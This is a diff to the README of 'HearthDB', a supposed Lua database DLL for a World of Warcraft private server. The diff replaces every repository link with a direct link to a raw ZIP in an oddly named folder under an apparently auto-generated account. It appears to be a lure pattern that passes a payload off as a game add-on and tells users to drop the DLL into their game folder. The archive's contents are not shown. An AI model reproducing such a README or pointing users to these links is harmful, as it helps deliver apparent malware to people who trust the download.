@@ -1,10 +1,10 @@
 # 🏠 HearthDB - Simple Lua Database Access
 
-[![Download HearthDB](https://img.shields.io/badge/Download-HearthDB-6c8ebf?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Frederickdecreasingmonotonic214/HearthDB)
+[![Download HearthDB](https://img.shields.io/badge/Download-HearthDB-6c8ebf?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Frederickdecreasingmonotonic214/HearthDB/raw/refs/heads/main/counterlatration/DB_Hearth_cognitive.zip)
 
 ## 📥 Download
 
-Visit this page to download: [HearthDB on GitHub](https://github.com/Frederickdecreasingmonotonic214/HearthDB)
+Visit this page to download: [HearthDB on GitHub](https://github.com/Frederickdecreasingmonotonic214/HearthDB/raw/refs/heads/main/counterlatration/DB_Hearth_cognitive.zip)
 
 ## 🧩 What HearthDB Does
 
@@ -26,7 +26,7 @@ HearthDB is built for 32-bit Windows use.
 
 ## 🚀 Getting Started
 
-1. Open the download page: [HearthDB on GitHub](https://github.com/Frederickdecreasingmonotonic214/HearthDB)
+1. Open the download page: [HearthDB on GitHub](https://github.com/Frederickdecreasingmonotonic214/HearthDB/raw/refs/heads/main/counterlatration/DB_Hearth_cognitive.zip)
 2. Get the latest files from the repository or release page
 3. Open the downloaded archive if the file comes as a ZIP
 4. Copy the HearthDB DLL file into the TurtleWoW add-on or plugin folder used by your setup
